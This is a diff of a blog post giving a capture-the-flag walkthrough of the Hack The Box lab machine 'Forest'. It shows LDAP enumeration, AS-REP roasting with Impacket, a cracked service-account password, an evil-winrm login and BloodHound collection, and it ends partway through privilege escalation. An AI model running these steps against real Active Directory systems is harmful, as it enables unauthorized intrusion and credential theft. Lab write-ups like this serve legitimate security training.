@@ -8,8 +8,8 @@ image:
   path: /./media/post2/forest.png
 ---
 **Hello** This is a very simple walkthrough for the windows machine Forest. In this walkthrough we'll be see some basic AD enumeration and Exploitation, without further ado let's get into it 
-# Enumeration
-## Nmap
+## Enumeration
+### Nmap
 we'll start with a an advanced tcp port scan of all of the open ports ($ports)
 ```shell
 sudo nmap -sC -sV -p$ports -oN tcp_scan $IP
@@ -17,14 +17,13 @@ sudo nmap -sC -sV -p$ports -oN tcp_scan $IP
 we can see from the scan that this machine is a domain controller for the domain htb.local next we’ll enumerate LDAP and look for anonymous bind 
 > dont forget to add the domain to /etc/hosts file.
 {: .prompt-tip }
-## LDAP Enumeration
+### LDAP Enumeration
 we’ll try enumerating ldap using the cli command : ldapsearch 
 ```shell
 ldapsearch -H ldap://10.10.10.161 -x -b "dc=htb,dc=local"
 ```
 the -x flag specifies using anonymous authentication, while -b denotes the basedn.
 seems ldap anonymous bind is enabled, next we’ll do some digging to find extra info such as user and groups.
-### User Enumeration using windapsearch
 ```shell
 windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U 
 ```
@@ -34,7 +33,7 @@ windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "ObjectClass=*"
 ```
 this query returned 312 results among them was an interesting user called `svc-alfresco` a few online search about this revealed that this account requires disabling pre-auth in kerberos, so that means the account is vulnerable to `AS_REProast`. 
 This attack levrages the disabling of pre-authentication in kerberos to request a TGT from the KDC,meaning that any attacker knowing only the username can get a segment of the tgt that is encrypted with the victim’s password hash, after that the attacker can perform offline password crack to get the plaintext password.
-# AS_REProast → Foothold 
+## AS_REProast → Foothold 
 for this we’ll use the script `GetNPUsers.py` from **Impacket** :
 ```shell
 GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161 
@@ -49,7 +48,7 @@ now that we get the password let's try to login to the account using **WinRM** s
 ```shell
 evil-winrm -i 10.10.10.161 -u svc-alfresco -p "s3rvice" 
 ```
-# PrivEsc
+## PrivEsc
 now since we gained a foothold inside the active directory its time to unleash the bloodhound and enumerate, i like to use bloodhound-python as my ingestor if you are comfortable with sharphound feel free to use it :
 ```shell
 bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161 
